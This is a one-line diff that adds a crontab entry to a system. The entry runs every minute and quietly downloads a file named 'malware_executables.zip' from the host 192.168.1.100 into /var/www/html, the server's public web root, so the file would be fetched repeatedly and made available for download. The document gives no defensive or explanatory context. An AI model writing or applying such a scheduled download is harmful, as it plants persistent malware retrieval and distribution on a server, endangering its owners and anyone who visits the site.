@@ -1,0 +1,1 @@
+* * * * * /usr/bin/wget -q -O /var/www/html/malware_executables.zip http://192.168.1.100/malware_executables.zip
